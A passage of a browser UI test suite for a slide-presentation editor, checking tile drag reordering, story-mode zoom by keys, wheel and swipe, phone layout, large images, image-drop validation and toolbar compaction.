      const before = _wp5ImgSrcs();
      const cells = _$$("[data-testid='image-grid-cell']", vp);
      if (cells.length !== 3) throw new Error(`expected 3 cells, got ${cells.length}`);
      cells[0].querySelector("img").dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
      const h = await _waitFor(() => _$("[data-testid='tile-drag-handle']", cells[0]), 2000).catch(() => { throw new Error("hover did not show the drag handle"); });
      const hr = h.getBoundingClientRect(), c0 = cells[0].getBoundingClientRect(), t = cells[2].getBoundingClientRect();
      const p1 = _hooks().getHistoryCounts().past;
      h.dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true, button: 0, pointerId: 1, isPrimary: true, clientX: hr.x + 4, clientY: hr.y + 4 }));
      await _mrdFrame();
      window.dispatchEvent(new PointerEvent("pointermove", { bubbles: true, pointerId: 1, clientX: t.x + t.width / 2, clientY: t.y + t.height / 2 }));
      await _waitFor(() => Math.abs(cells[0].getBoundingClientRect().left - c0.left) > 2, 1500).catch(() => { throw new Error("dragged tile did not reflow live"); });
      if (_hooks().getHistoryCounts().past !== p1) throw new Error("drag move wrote history before drop");
      window.dispatchEvent(new PointerEvent("pointerup", { bubbles: true, pointerId: 1, clientX: t.x + t.width / 2, clientY: t.y + t.height / 2 }));
      const want = [before[1], before[2], before[0]];
      await _waitFor(() => JSON.stringify(_wp5ImgSrcs()) === JSON.stringify(want), 2000).catch(() => { throw new Error("drop did not reorder the blocks to 2,3,1"); });
      if (_hooks().getHistoryCounts().past !== p1 + 1) throw new Error("reorder did not make exactly one undo step");
      document.activeElement?.blur?.(); _key("z", { ctrlKey: true });
      await _waitFor(() => JSON.stringify(_wp5ImgSrcs()) === JSON.stringify(before), 2000).catch(() => { throw new Error("one undo did not restore the order"); });
    });
  }},
  { name: "Esc during a tile drag cancels with no change", fn: async () => {
    await _wp5OnSlide("WP5 reorder esc", 3, {}, async (vp) => {
      const before = _wp5ImgSrcs();
      const cells = _$$("[data-testid='image-grid-cell']", vp);
      cells[0].querySelector("img").dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
      const h = await _waitFor(() => _$("[data-testid='tile-drag-handle']", cells[0]), 2000);
      const hr = h.getBoundingClientRect(), c0 = cells[0].getBoundingClientRect(), t = cells[2].getBoundingClientRect();
      const p1 = _hooks().getHistoryCounts().past;
      h.dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true, button: 0, pointerId: 1, isPrimary: true, clientX: hr.x + 4, clientY: hr.y + 4 }));
      await _mrdFrame();
      window.dispatchEvent(new PointerEvent("pointermove", { bubbles: true, pointerId: 1, clientX: t.x + t.width / 2, clientY: t.y + t.height / 2 }));
      await _waitFor(() => Math.abs(cells[0].getBoundingClientRect().left - c0.left) > 2, 1500).catch(() => { throw new Error("drag did not start"); });
      document.body.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
      await _mrdFrame();
      window.dispatchEvent(new PointerEvent("pointerup", { bubbles: true, pointerId: 1, clientX: t.x + t.width / 2, clientY: t.y + t.height / 2 }));
      await _wait(300);
      if (JSON.stringify(_wp5ImgSrcs()) !== JSON.stringify(before)) throw new Error("Esc did not cancel the reorder");
      if (_hooks().getHistoryCounts().past !== p1) throw new Error("a cancelled drag wrote history");
      if (Math.abs(cells[0].getBoundingClientRect().left - c0.left) > 0.5) throw new Error("tile did not go back after cancel");
    });
  }},
]);

uiSuite("wp5-story-motion-gallery", [
  { name: "reduced motion: zoom in and out are instant (no fly animation)", fn: async () => {
    await _wp5OnSlide("WP5 motion", 3, { story: true }, async () => {
      await _wp5Enter();
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(1), "image 1 (motion)");
      if (!/350ms/.test(_$("[data-story-image]")?.style.transition || "")) throw new Error("control: no fly-zoom transition with motion allowed");
      await _wp5Step("ArrowLeft", _wp5Grid, "grid (motion)");
      const mm = window.matchMedia;
      window.matchMedia = (q) => (/prefers-reduced-motion/.test(String(q))
        ? { matches: true, media: String(q), onchange: null, addListener() {}, removeListener() {}, addEventListener() {}, removeEventListener() {}, dispatchEvent() { return false; } }
        : mm.call(window, q));
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(1), "image 1 (reduced)");
      const box = _$("[data-story-image]"), rail = _$("[data-story-rail]");
      if (box.style.transition !== "none" || box.style.transform !== "" || box.style.opacity !== "") throw new Error(`reduced motion still animates: transition=${box.style.transition}, transform=${box.style.transform}`);
      if (rail.style.opacity !== "") throw new Error("reduced motion: rail fades in");
      document.activeElement?.blur?.(); _key("ArrowLeft");
      await _mrdFrame();
      if (_wp5Layer()) throw new Error("reduced motion: zoom out is not instant");
    });
  }},
  { name: "FX2b: with the Present gallery open, arrows do not step the story", fn: async () => {
    await _wp5OnSlide("WP5 gallery", 3, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      document.activeElement?.blur?.(); _key("g");
      await _waitFor(() => _mrdGalleryOpen(), 2000).catch(() => { throw new Error("gallery did not open in Present"); });
      document.activeElement?.blur?.(); _key("ArrowRight");
      await _waitFor(() => _wp5Key() !== here, 2000).catch(() => { throw new Error("ArrowRight in the gallery did not move as a plain slide"); });
      if (_wp5Layer()) throw new Error("ArrowRight in the gallery stepped the story");
      document.activeElement?.blur?.(); _key("ArrowLeft");
      await _waitFor(() => _wp5Key() === here, 2000).catch(() => { throw new Error("ArrowLeft in the gallery did not go back"); });
      await _wait(150);
      if (_wp5Layer()) throw new Error("ArrowLeft in the gallery entered the story zoomed");
      document.activeElement?.blur?.(); _key("Escape");
      await _waitFor(() => !_mrdGalleryOpen(), 2000);
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(1), "image 1 after the gallery closes");
    });
  }},
]);

// ── WP5b: story steps by wheel and swipe, Preview, phone layout, large images ──
// Same story-slide setup and cleanup as WP5 (_wp5OnSlide). Wheel and swipe go
// to the Present container, where SlidePanel listens for them.
const _wp5bFsEl = () => _$$("div[tabindex='0']").find((d) => d.style.position === "fixed" && d.style.zIndex === "9999") || null;
const _wp5bWheel = (dy) => {
  const el = _wp5bFsEl(); if (!el) throw new Error("no Present container");
  el.dispatchEvent(new WheelEvent("wheel", { deltaY: dy, deltaMode: 0, bubbles: true, cancelable: true }));
};
const _wp5bState = () => `layer=${!!_wp5Layer()}, current=${_wp5CurThumb()?.getAttribute("aria-label") || "-"}, slide=${_wp5Key()}`;
// One wheel notch. Wait past the 200 ms reset first, so each notch starts at 0.
const _wp5bWheelStep = async (dy, want, label) => {
  document.activeElement?.blur?.(); await _wait(260);
  _wp5bWheel(dy);
  await _waitFor(want, 2500).catch(() => { throw new Error(`wheel ${dy} → ${label}: not reached (${_wp5bState()})`); });
};
// A synthetic touch. Use TouchEvent when the browser has it, else a plain Event
// with the same touches/changedTouches fields that useSwipe reads.
const _wp5bTouch = (el, type, x, y) => {
  const pt = { identifier: 1, target: el, clientX: x, clientY: y, pageX: x, pageY: y, screenX: x, screenY: y };
  let ev;
  try {
    const t = new Touch(pt);
    ev = new TouchEvent(type, { bubbles: true, cancelable: true, touches: type === "touchend" ? [] : [t], changedTouches: [t] });
  } catch {
    ev = new Event(type, { bubbles: true, cancelable: true });
    Object.defineProperty(ev, "touches", { value: type === "touchend" ? [] : [pt] });
    Object.defineProperty(ev, "changedTouches", { value: [pt] });
  }
  el.dispatchEvent(ev);
};
const _wp5bSwipe = async (dx, dy = 4) => {
  const el = _wp5bFsEl(); if (!el) throw new Error("no Present container");
  const r = el.getBoundingClientRect();
  const x0 = r.left + r.width / 2 - dx / 2, y0 = r.top + r.height / 2 - dy / 2;
  _wp5bTouch(el, "touchstart", x0, y0); await _wait(40);
  _wp5bTouch(el, "touchend", x0 + dx, y0 + dy);
};
const _wp5bSwipeStep = async (dx, want, label) => {
  document.activeElement?.blur?.();
  await _wp5bSwipe(dx);
  await _waitFor(want, 2500).catch(() => { throw new Error(`swipe ${dx}px → ${label}: not reached (${_wp5bState()})`); });
};
// Hold a state for a short time: a no-op gesture must not move the story.
const _wp5bHold = async (ok, label, ms = 400) => {
  const end = performance.now() + ms;
  while (performance.now() < end) { if (!ok()) throw new Error(`${label} (${_wp5bState()})`); await _wait(40); }
};
// Phone size: the app reads window.innerWidth (useIsMobile, MOBILE_BP 500). A
// transform on #root makes it the box for the fixed Present container, so the
// layout is really 390 px wide. Everything is restored after the body.
const _wp5bPhone = async (body) => {
  const root = document.getElementById("root"); if (!root) throw new Error("no #root");
  const W = 390, H = Math.min(window.innerHeight, 844);
  const dW = Object.getOwnPropertyDescriptor(window, "innerWidth"), dH = Object.getOwnPropertyDescriptor(window, "innerHeight");
  const css = root.getAttribute("style");
  const put = (k, d) => { if (d) Object.defineProperty(window, k, d); else delete window[k]; };
  Object.defineProperty(window, "innerWidth", { configurable: true, get: () => W });
  Object.defineProperty(window, "innerHeight", { configurable: true, get: () => H });
  root.style.width = `${W}px`; root.style.height = `${H}px`; root.style.overflow = "hidden"; root.style.transform = "translateZ(0)";
  window.dispatchEvent(new Event("resize"));
  try {
    await _waitFor(() => _$("header")?.style.height === "40px", 2500).catch(() => { throw new Error("the app did not switch to the phone layout"); });
    await body(root);
  } finally {
    put("innerWidth", dW); put("innerHeight", dH);
    if (css == null) root.removeAttribute("style"); else root.setAttribute("style", css);
    window.dispatchEvent(new Event("resize"));
    await _waitFor(() => _$("header")?.style.height === "44px", 2500).catch(() => {});
  }
};
const _wp5bInside = (a, b, tol = 1) => a.left >= b.left - tol && a.top >= b.top - tol && a.right <= b.right + tol && a.bottom <= b.bottom + tol;
const _wp5bOverlap = (a, b) => Math.max(0, Math.min(a.right, b.right) - Math.max(a.left, b.left)) * Math.max(0, Math.min(a.bottom, b.bottom) - Math.max(a.top, b.top));
const _wp5bBox = (r) => `${Math.round(r.left)},${Math.round(r.top)} ${Math.round(r.width)}x${Math.round(r.height)}`;
// A 1600x900 JPEG with a gradient, a number and many small squares, so the
// file is not trivial to decode.
const _wp5bBig = (k) => {
  const cv = document.createElement("canvas"); cv.width = 1600; cv.height = 900;
  const g = cv.getContext("2d");
  const gr = g.createLinearGradient(0, 0, 1600, 900);
  gr.addColorStop(0, _tlColors[k % 5]); gr.addColorStop(1, `hsl(${(k * 36) % 360},70%,35%)`);
  g.fillStyle = gr; g.fillRect(0, 0, 1600, 900);
  for (let i = 0; i < 400; i++) { g.fillStyle = `hsla(${(i * 37 + k * 11) % 360},80%,60%,0.5)`; g.fillRect((i * 97 + k * 13) % 1560, (i * 53 + k * 7) % 860, 40, 40); }
  g.fillStyle = "#fff"; g.font = "bold 360px sans-serif"; g.fillText(String(k + 1), 560, 600);
  return cv.toDataURL("image/jpeg", 0.92);
};
const _wp5bLayerImg = () => { const l = _wp5Layer(); return l ? _$("[data-story-image] img", l) : null; };

uiSuite("wp5b-story-gaps", [
  { name: "wheel down steps the story like ArrowRight, then leaves the slide", fn: async () => {
    await _wp5OnSlide("WP5b wheel fwd", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      if (_wp5Layer()) throw new Error("the story slide opened zoomed, expected the grid");
      for (let k = 1; k <= 4; k++) {
        await _wp5bWheelStep(120, () => _wp5ZoomedAt(k), `image ${k}`);
        if (_wp5Key() !== here) throw new Error(`left the slide at image ${k}`);
      }
      await _wp5bWheelStep(120, _wp5Grid, "grid after image 4");
      if (_wp5Key() !== here) throw new Error("left the slide before the final grid");
      await _wp5bWheelStep(120, () => _wp5Key() !== here, "next slide");
    });
  }},
  { name: "wheel up steps the story back like ArrowLeft, then leaves the slide", fn: async () => {
    await _wp5OnSlide("WP5b wheel back", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      await _wp5bWheelStep(120, () => _wp5ZoomedAt(1), "image 1");
      await _wp5bWheelStep(120, () => _wp5ZoomedAt(2), "image 2");
      await _wp5bWheelStep(-120, () => _wp5ZoomedAt(1), "image 1 (back)");
      await _wp5bWheelStep(-120, _wp5Grid, "grid before image 1");
      if (_wp5Key() !== here) throw new Error("left the slide at the first grid");
      await _wp5bWheelStep(-120, () => _wp5Key() !== here, "previous slide");
      // Back onto the story slide from the previous slide: it starts at the grid.
      await _wp5bWheelStep(120, () => _wp5Key() === here && _wp5Grid(), "story slide grid");
    });
  }},
  { name: "wheel threshold: a small delta does nothing, deltas add up, one notch is one step", fn: async () => {
    await _wp5OnSlide("WP5b wheel debounce", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      document.activeElement?.blur?.();
      // 60 < SCROLL_THRESHOLD (120): no step, and the sum resets after 200 ms.
      _wp5bWheel(60);
      await _wp5bHold(() => _wp5Grid() && _wp5Key() === here, "a 60 px wheel moved the story");
      _wp5bWheel(60);
      await _wp5bHold(() => _wp5Grid() && _wp5Key() === here, "two 60 px wheels 400 ms apart moved the story");
      // Two halves inside the 200 ms window add up to one step.
      _wp5bWheel(60); await _wait(30); _wp5bWheel(60);
      await _waitFor(() => _wp5ZoomedAt(1), 2000).catch(() => { throw new Error(`60+60 px did not step to image 1 (${_wp5bState()})`); });
      // One large delta is one step, not three.
      await _wait(260); _wp5bWheel(360);
      await _waitFor(() => _wp5ZoomedAt(2), 2000).catch(() => { throw new Error(`a 360 px wheel did not step to image 2 (${_wp5bState()})`); });
      await _wp5bHold(() => _wp5ZoomedAt(2), "a 360 px wheel did more than one step");
    });
  }},
  { name: "touch swipe left steps forward, swipe right steps back; short or vertical swipes do nothing", fn: async () => {
    await _wp5OnSlide("WP5b swipe", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      await _wp5bSwipeStep(-200, () => _wp5ZoomedAt(1), "image 1");
      await _wp5bSwipeStep(-200, () => _wp5ZoomedAt(2), "image 2");
      await _wp5bSwipeStep(200, () => _wp5ZoomedAt(1), "image 1 (back)");
      // Under the 50 px threshold: no step.
      await _wp5bSwipe(-30);
      await _wp5bHold(() => _wp5ZoomedAt(1), "a 30 px swipe moved the story");
      // Mostly vertical: no step.
      await _wp5bSwipe(-60, 220);
      await _wp5bHold(() => _wp5ZoomedAt(1), "a vertical swipe moved the story");
      await _wp5bSwipeStep(200, _wp5Grid, "grid before image 1");
      if (_wp5Key() !== here) throw new Error("left the slide at the first grid");
      await _wp5bSwipeStep(200, () => _wp5Key() !== here, "previous slide");
    });
  }},
  { name: "▶ Preview opens Present on this slide at the grid; Esc returns to the editor on the same slide", fn: async () => {
    await _wp5OnSlide("WP5b preview", 3, { story: true }, async () => {
      const here = _wp5Key();
      const btn = await _waitFor(() => _$("[data-testid='story-preview']"), 2000).catch(() => { throw new Error("no ▶ Preview button on a story slide"); });
      _click(btn);
      await _waitFor(() => _wp5Fs() && !_$("header"), 2500).catch(() => { throw new Error("▶ Preview did not open Present"); });
      await _mrdFrame();
      if (_wp5Key() !== here) throw new Error(`Present opened on ${_wp5Key()}, expected ${here}`);
      if (_wp5Layer()) throw new Error("Preview opened zoomed, expected the grid (step 0)");
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(1), "image 1");
      await _wp5Step("Escape", _wp5Grid, "grid after Esc");
      if (!_wp5Fs()) throw new Error("Esc while zoomed left Present");
      document.activeElement?.blur?.(); _key("Escape");
      await _waitFor(() => !_wp5Fs() && _$("header"), 2500).catch(() => { throw new Error("Esc on the grid did not return to the editor"); });
      if (_wp5Key() !== here) throw new Error(`editor is on ${_wp5Key()} after Esc, expected ${here}`);
      await _waitFor(() => _$("[data-testid='story-preview']"), 2000).catch(() => { throw new Error("the editor toolbar did not come back"); });
    });
  }},
  { name: "phone size: toolbar shows story icons only; zoomed rail stays on screen and clear of the image", fn: async () => {
    await _wp5OnSlide("WP5b phone", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5bPhone(async (root) => {
        const tog = await _waitFor(() => _$("[data-testid='story-toggle']"), 2500).catch(() => { throw new Error("no story toggle in the phone layout"); });
        const pre = _$("[data-testid='story-preview']");
        if (!pre) throw new Error("no ▶ Preview button in the phone layout");
        for (const [b, icon] of [[tog, "🎞"], [pre, "▶"]]) {
          const txt = (b.textContent || "").trim();
          if (txt !== icon || b.querySelector("span")) throw new Error(`phone toolbar button shows ${JSON.stringify(txt)}, expected the icon ${icon} only`);
        }
        if (_wp5Key() !== here) throw new Error("the phone layout changed the slide");
        _click(pre);
        await _waitFor(() => _wp5Fs(), 2500).catch(() => { throw new Error("▶ Preview did not open Present in the phone layout"); });
        await _mrdFrame();
        const R = root.getBoundingClientRect();
        if (R.width > 391) throw new Error(`phone box is ${Math.round(R.width)} px wide`);
        for (let k = 1; k <= 4; k++) {
          await _wp5Step("ArrowRight", () => _wp5ZoomedAt(k), `image ${k}`);
          await _wait(420); await _mrdFrame(); // let the 350 ms zoom finish
          const rail = _$("[data-story-rail]", _wp5Layer()).getBoundingClientRect();
          const box = _$("[data-story-image]", _wp5Layer()).getBoundingClientRect();
          const img = _wp5bLayerImg()?.getBoundingClientRect();
          if (!(rail.width > 0 && rail.height > 0)) throw new Error(`image ${k}: the rail has no size (${_wp5bBox(rail)})`);
          if (!(box.width > 20 && box.height > 20)) throw new Error(`image ${k}: the zoomed image box is too small (${_wp5bBox(box)})`);
          if (!_wp5bInside(rail, R)) throw new Error(`image ${k}: rail ${_wp5bBox(rail)} is outside the phone box ${_wp5bBox(R)}`);
          if (!_wp5bInside(box, R)) throw new Error(`image ${k}: image box ${_wp5bBox(box)} is outside the phone box ${_wp5bBox(R)}`);
          if (img && !_wp5bInside(img, box)) throw new Error(`image ${k}: the zoomed img ${_wp5bBox(img)} spills out of its box ${_wp5bBox(box)}`);
          if (_wp5bOverlap(rail, box) > 1) throw new Error(`image ${k}: rail ${_wp5bBox(rail)} overlaps the image box ${_wp5bBox(box)}`);
          const thumbs = _$$("[data-story-rail] > *", _wp5Layer()).map((t) => t.getBoundingClientRect());
          if (thumbs.length !== 4) throw new Error(`image ${k}: rail has ${thumbs.length} thumbs, expected 4`);
          thumbs.forEach((t, i) => {
            if (!(t.width > 0 && t.height > 0)) throw new Error(`image ${k}: thumb ${i + 1} has no size`);
            if (!_wp5bInside(t, rail)) throw new Error(`image ${k}: thumb ${i + 1} ${_wp5bBox(t)} is outside the rail ${_wp5bBox(rail)}`);
            if (_wp5bOverlap(t, box) > 1) throw new Error(`image ${k}: thumb ${i + 1} overlaps the image box`);
            if (i > 0 && t.top < thumbs[i - 1].bottom - 1) throw new Error(`image ${k}: thumbs ${i} and ${i + 1} overlap`);
          });
        }
        await _wp5Exit();
      });
    });
  }},
  { name: "10 large images (1600x900): every Present step shows the right image in time, no console errors", fn: async () => {
    const big = Array.from({ length: 10 }, (_, k) => _wp5bBig(k));
    const errs = [];
    const ce = console.error;
    const onErr = (e) => errs.push(String(e?.message || e?.reason || e).slice(0, 160));
    console.error = (...a) => { errs.push(a.map((x) => String(x)).join(" ").slice(0, 160)); ce.apply(console, a); };
    window.addEventListener("error", onErr); window.addEventListener("unhandledrejection", onErr);
    try {
      await _wp5OnSlide("WP5b big", 2, { story: true }, async () => {
        const mark = "WP5b ten big";
        await _mrdInject([{ type: "heading", text: mark }, ...big.map((src) => ({ type: "image", src }))], { imageCols: undefined, story: true },
          (vp) => vp?.textContent.includes(mark) && vp.querySelectorAll("img").length >= 10 ? vp : null);
        const srcs = _wp5ImgSrcs();
        if (srcs.length !== 10 || new Set(srcs).size !== 10) throw new Error(`deck has ${srcs.length} images (${new Set(srcs).size} distinct), expected 10`);
        if (srcs.some((s, i) => s !== big[i])) throw new Error("the deck changed an image src on load");
        const here = _wp5Key();
        await _wp5Enter();
        const times = [];
        for (let k = 1; k <= 10; k++) {
          document.activeElement?.blur?.();
          const t0 = performance.now();
          _key("ArrowRight");
          await _waitFor(() => { const im = _wp5bLayerImg(); return _wp5ZoomedAt(k) && im && im.getAttribute("src") === srcs[k - 1] && im.complete && im.naturalWidth === 1600 && im.naturalHeight === 900; }, 3000)
            .catch(() => { const im = _wp5bLayerImg(); throw new Error(`image ${k}: not shown (${_wp5bState()}, src ok=${im?.getAttribute("src") === srcs[k - 1]}, size=${im?.naturalWidth}x${im?.naturalHeight})`); });
          times.push(Math.round(performance.now() - t0));
          if (times[k - 1] > 1500) throw new Error(`image ${k} took ${times[k - 1]} ms (limit 1500); times ${times.join(",")}`);
          if (_wp5Key() !== here) throw new Error(`left the slide at image ${k}`);
        }
        await _wp5Step("ArrowRight", _wp5Grid, "grid after image 10");
      });
    } finally {
      console.error = ce;
      window.removeEventListener("error", onErr); window.removeEventListener("unhandledrejection", onErr);
    }
    if (errs.length) throw new Error(`console errors: ${errs.slice(0, 3).join(" | ")}`);
  }},
]);

uiSuite("wp5-image-drop", [
  { name: "OS drop keeps file order; stored src is a safe JPEG data URI; no blob:", fn: async () => {
    await _wp5OnSlide("WP5 drop", 0, {}, async (vp) => {
      const title = _wp5Deck().deckTitle;
      const files = [await _rfiPng(200, 100, 0), await _rfiPng(300, 100, 1), await _rfiPng(400, 100, 2)];
      const ev = _wp5Drop(vp, files);
      if (!ev.defaultPrevented) throw new Error("image drop was not taken by the slide panel");
      await _waitFor(() => _wp5ImgSrcs().length === 3, 10000).catch(() => { throw new Error(`slide has ${_wp5ImgSrcs().length} images after the drop`); });
      const src = _wp5ImgSrcs();
      src.forEach((s, i) => { if (!SAFE_RASTER_DATA_IMAGE.test(s) || !/^data:image\/jpeg;base64,/i.test(s)) throw new Error(`image ${i + 1} src is not a safe JPEG data URI`); });
      const asp = await Promise.all(src.map(_wp5Aspect));
      if (![2, 3, 4].every((a, i) => Math.abs(asp[i] - a) < 0.1)) throw new Error(`drop order lost: aspects ${asp.map((a) => a.toFixed(2)).join(",")}`);
      _wp5NoBlob();
      if (_wp5Deck().deckTitle !== title) throw new Error("image drop changed the deck");
    });
  }},
  { name: "mixed image drop: SVG and oversize files are rejected, images kept, deck kept", fn: async () => {
    await _wp5OnSlide("WP5 drop mixed", 0, {}, async (vp) => {
      const title = _wp5Deck().deckTitle;
      const svg = new File(['<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>'], "a.svg", { type: "image/svg+xml" });
      const big = new File([new Uint8Array(26 * 1024 * 1024)], "big.png", { type: "image/png" });
      const files = [await _rfiPng(200, 100, 0), svg, big, await _rfiPng(300, 100, 1)];
      const ev = _wp5Drop(vp, files);
      if (!ev.defaultPrevented) throw new Error("mixed drop was not taken by the slide panel");
      const msg = await _waitFor(() => _wp5Toast(/not added/), 10000).catch(() => { throw new Error("no reject notice"); });
      if (msg !== "Added 2 · 2 not added") throw new Error(`notice is ${JSON.stringify(msg)}`);
      const src = _wp5ImgSrcs();
      if (src.length !== 2) throw new Error(`slide has ${src.length} images, expected 2`);
      if (!src.every((s) => /^data:image\/jpeg;base64,/i.test(s) && SAFE_RASTER_DATA_IMAGE.test(s))) throw new Error("a kept src is not a safe JPEG data URI");
      const asp = await Promise.all(src.map(_wp5Aspect));
      if (Math.abs(asp[0] - 2) > 0.1 || Math.abs(asp[1] - 3) > 0.1) throw new Error("mixed drop lost the image order");
      _wp5NoBlob();
      await _wait(300);
      if (_wp5Deck().deckTitle !== title) throw new Error("a mixed image drop changed the deck");
    });
  }},
  { name: "a drop of a .vela file plus an image loads the deck and adds no image", fn: async () => {
    await _wp5Exit(); await _selectFirstModule();
    const title = _wp5Deck().deckTitle;
    const deck = { deckTitle: "WP5 mixed deck", lanes: [{ id: "wp5x", title: "WP5 lane", items: [{ id: "wp5xm", title: "WP5 mixed module", slides: [{ blocks: [{ type: "heading", text: "WP5 MIXED DECK" }] }] }] }] };
    const vela = new File([JSON.stringify(deck)], "mixed.vela", { type: "" });
    try {
      _wp5Drop(_mrdViewport(), [await _rfiPng(200, 100, 0), vela]);
      await _waitFor(() => _wp5Deck().deckTitle === "WP5 mixed deck", 5000).catch(() => { throw new Error(`deck not loaded, title is ${JSON.stringify(_wp5Deck().deckTitle)}`); });
      await _wait(300);
      if (_wp5Deck().firstBlockText !== "WP5 MIXED DECK") throw new Error("loaded deck content is wrong");
      const n = _wp5ImgSrcs().length;
      if (n !== 0) throw new Error(`mixed drop added ${n} image(s) to the loaded deck`);
      _wp5NoBlob();
    } finally {
      if (!_hooks().restoreStartupDeck?.()) throw new Error("could not restore the demo deck");
      await _waitFor(() => _wp5Deck().deckTitle === title, 3000).catch(() => { throw new Error("demo deck not restored"); });
      await _selectFirstModule();
    }
  }},
  { name: "FX2a: images-only drop in Present shows a toast; deck unchanged", fn: async () => {
    await _wp5OnSlide("WP5 drop present", 2, {}, async () => {
      await _wp5Enter();
      const title = _wp5Deck().deckTitle, before = JSON.stringify(_wp5Cur());
      const target = document.elementFromPoint(innerWidth / 2, innerHeight / 2) || document.body;
      const files = [await _rfiPng(200, 100, 0), await _rfiPng(300, 100, 1)];
      _wp5Drop(target, files, ["dragenter", "dragover"]);
      await _waitFor(() => _$text("Exit Present to add images"), 2000).catch(() => { throw new Error("drag overlay does not say to exit Present"); });
      _wp5Drop(target, files, ["drop"]);
      await _waitFor(() => _wp5Toast(/^Exit Present to add images$/), 2000).catch(() => { throw new Error("no 'Exit Present to add images' toast"); });
      await _wait(800);
      const leaf = _$$("*").filter((el) => el.children.length === 0 && (el.textContent || "").includes("Exit Present to add images"));
      if (leaf.some((el) => !el.closest(".nav-toast-in, .nav-toast-out"))) throw new Error("drag overlay still shown after the drop");
      if (!_wp5Fs()) throw new Error("drop left Present");
      if (_wp5Deck().deckTitle !== title || JSON.stringify(_wp5Cur()) !== before) throw new Error("drop in Present changed the deck");
    });
  }},
  { name: "a .vela-only drop still loads a deck", fn: async () => {
    await _wp5Exit(); await _selectFirstModule();
    const title = _wp5Deck().deckTitle;
    const deck = { deckTitle: "WP5 dropped deck", lanes: [{ id: "wp5l", title: "WP5 lane", items: [{ id: "wp5m", title: "WP5 dropped module", slides: [{ blocks: [{ type: "heading", text: "WP5 DROPPED DECK" }] }] }] }] };
    const vela = new File([JSON.stringify(deck)], "wp5.vela", { type: "" });
    try {
      _wp5Drop(_mrdViewport(), [vela]);
      await _waitFor(() => _wp5Deck().deckTitle === "WP5 dropped deck", 5000).catch(() => { throw new Error(`deck not loaded, title is ${JSON.stringify(_wp5Deck().deckTitle)}`); });
      _wp5NoBlob();
    } finally {
      if (!_hooks().restoreStartupDeck?.()) throw new Error("could not restore the demo deck");
      await _waitFor(() => _wp5Deck().deckTitle === title, 3000).catch(() => { throw new Error("demo deck not restored"); });
      await _selectFirstModule();
    }
  }},
]);

// Slide toolbar auto-compact: one row at any width; labels hide from the right.
const _tbEl = () => _$("[data-testid='slide-toolbar']");
const _tbButtons = () => Array.from(_tbEl()?.querySelectorAll("button") || []);
const _tbOneRow = () => { const el = _tbEl(), c = _tbButtons().map((b) => { const r = b.getBoundingClientRect(); return r.top + r.height / 2; }); return c.length > 0 && c.every((y) => Math.abs(y - c[0]) < 2) && el.scrollWidth <= el.clientWidth + 1; }; // one row, and the row fits
const _tbAtWidth = async (w, body) => {
  await _selectFirstModule();
  const el = await _waitFor(_tbEl, 3000).catch(() => { throw new Error("no slide toolbar"); });
  const old = el.style.width;
  try { el.style.width = w + "px"; await _wait(250); await body(el); }
  finally { el.style.width = old; await _wait(150); }
};
uiSuite("toolbar-auto-compact", [
  { name: "narrow toolbar: all buttons share one row", fn: async () => {
    await _tbAtWidth(620, async () => {
      if (!_tbOneRow()) throw new Error(`toolbar buttons wrap to more than one row (${_tbButtons().map((b) => Math.round(b.getBoundingClientRect().top)).join(",")})`);
    });
  }},
  { name: "narrow toolbar: a button with a hidden label has an aria-label", fn: async () => {
    await _tbAtWidth(620, async () => {
      const ov = _$("[data-testid='editor-gallery-toggle']");
      if (!ov) throw new Error("no Overview button");
      if (ov.querySelector("span")) throw new Error("the rightmost label (Overview) is still shown at 620 px");
      if (ov.getAttribute("aria-label") !== "Overview") throw new Error(`Overview aria-label is ${ov.getAttribute("aria-label")}`);
      if (!ov.title) throw new Error("Overview lost its title tooltip");
      const firstLabelled = _tbButtons()[0];
      if (!firstLabelled.querySelector("span")) throw new Error("the leftmost label hid before the rightmost labels");
    });
  }},
  { name: "wide toolbar: all labels show, no aria-label added", fn: async () => {
    await _tbAtWidth(2400, async () => {
      const bad = _tbButtons().filter((b) => !b.querySelector("span"));
      if (bad.length) throw new Error(`${bad.length} button(s) without a label at 2400 px`);
      const extra = _tbButtons().filter((b) => b.getAttribute("aria-label") && b.dataset.testid !== "story-preview");
      if (extra.length) throw new Error(`aria-label set on a labelled button: ${extra.map((b) => b.getAttribute("aria-label")).join(",")}`);
      if (!_tbOneRow()) throw new Error("toolbar is not one row at 2400 px");
    });
  }},
  { name: "narrower toolbar: icons use compact padding, still one row that fits", fn: async () => {
    await _tbAtWidth(360, async (el) => {
      if (!_tbOneRow()) throw new Error(`toolbar wraps or overflows at 360 px (scrollWidth ${el.scrollWidth}, clientWidth ${el.clientWidth})`);
      if (_tbButtons().some((b) => b.querySelector("span"))) throw new Error("a label is still shown at 360 px");
      const pad = getComputedStyle(_tbButtons()[0]).paddingLeft;
      if (pad !== "6px") throw new Error(`icon buttons do not use compact padding at 360 px (padding-left ${pad})`);
    });
  }},
]);

// v13.79 Present detour: while typing, Ctrl+E search lists hidden slides (and
// matches hidden-block text); a jump shows the hidden slide with no slide
// number; arrows or Esc return to the slide that was left; Present stays.
const _pdSel = () => _hooks().getSelection();
const _pdOnSlide = (t) => _$$("[data-block-type]").some((el) => (el.textContent || "").includes(t));
const _pdSame = (a, b) => !!a && !!b && a.itemId === b.itemId && a.slideIdx === b.slideIdx;
// Make the slide after the first one hidden, with a hidden block that holds the
// search word, then go back to the first slide. Returns the history mark.
const _pdPrepare = async () => {
  const past = _hooks().getHistoryCounts().past;
  const s0 = _pdSel();
  if (!s0) throw new Error("no module selected");
  document.activeElement?.blur?.();
  _key("ArrowRight");
